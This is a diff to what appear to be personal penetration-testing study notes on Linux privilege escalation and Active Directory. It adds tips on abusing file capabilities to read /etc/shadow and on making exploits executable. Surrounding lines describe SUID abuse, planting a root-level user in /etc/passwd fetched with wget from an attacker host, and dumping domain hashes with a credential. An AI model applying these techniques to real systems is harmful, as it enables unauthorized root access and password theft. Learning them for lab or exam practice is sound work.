@@ -917,6 +917,16 @@ whoami
 - condition 1: nginxed-root.sh[CVE-2016-1247], affecting nginx < v1.6.2
 - condition 2: suid bit set for sudo
 
+11. using capabilities
+- Detection: 'getcap -r / 2>/dev/nu'. If /usr/bin/python2.6 = cap_setuid+ep  
+- Exploitation: got GTFObins -> search under 'capabilities'
+- if we have capabilties to run tar, we can zip /etc/shadow and then unzip, in order to read the unzipped /etc/shadow with permission, where we can break thepassword hash and gain privilege as root.
+
+12. LXD <skipped>
+- https://www.hackingarticles.in/lxd-privilege-escalation/ 
+
+13. Docker <skipped>
+- https://www.hackingarticles.in/docker-privilege-escalation/
 
 # Active Directory Pentesting
 ## Enumeration
@@ -1376,10 +1386,12 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 ## General tips
 - If Linpeas cannot found vulnerabilties, use linux-exploit-suggester (https://github.com/mzet-/linux-exploit-suggester)
 - /dev/null is the standard Linux device where you send output that you want ignored.
+- if mount point is needed, try to use /etc , so we can access /etc/passwd
 - /tmp directory has all permission to create or delete any file, use it
 - if SUID is set ofr a binary program and to GTFObins requires LFILE=file_to_read, we can set LFILE=/etc/shadow, and unhash the password and do a 'su' or switch user.
 - If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
 - If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'
+- If program/exploit cannot run, try 'chmod +x exploit' or 'chmod 777 exploit'
 - if '/bin/bash' doesnt work, try '/bin/sh'
 - to run binary program, can specify '/home' instead of current directory '.'
 - [if SUID bit set for cp, we can add a new user with root privileges to /etc/passwd file] to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignite:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
